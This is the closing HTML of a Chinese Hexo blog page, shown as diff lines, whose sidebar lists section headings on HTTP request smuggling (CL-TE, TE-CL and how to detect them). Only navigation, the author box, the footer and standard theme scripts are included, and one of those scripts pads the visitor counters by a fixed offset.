class="nav-item nav-level-3"><a class="nav-link" href="#CL-TE"><span class="nav-number">4.3.</span> <span class="nav-text">CL-TE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-CL"><span class="nav-number">4.4.</span> <span class="nav-text">TE-CL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TE-TE"><span class="nav-number">4.5.</span> <span class="nav-text">TE-TE</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="nav-number">5.</span> <span class="nav-text">检测请求走私</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E6%A3%80%E6%B5%8BCL-TE%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.1.</span> <span class="nav-text">计时技术检测CL-TE漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E6%97%B6%E6%8A%80%E6%9C%AF%E6%A3%80%E6%B5%8BTE-CL%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.2.</span> <span class="nav-text">计时技术检测TE-CL漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E6%A3%80%E6%B5%8BCL-TE%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.3.</span> <span class="nav-text">差异响应检测CL-TE漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%AE%E5%BC%82%E5%93%8D%E5%BA%94%E6%A3%80%E6%B5%8BTE-CL%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.4.</span> <span class="nav-text">差异响应检测TE-CL漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E6%A3%80%E6%B5%8B"><span class="nav-number">5.5.</span> <span class="nav-text">工具检测</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Kwansh"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Kwansh</p>
+  <div class="site-description" itemprop="description">往事越千年,魏武挥鞭,东临碣石有遗篇。萧瑟秋风今又是,换了人间</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">41</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:eminemgcxwlp@gmail.com" title="E-Mail → mailto:eminemgcxwlp@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2025\4\21 – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kwansh</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+</body>
+</html>
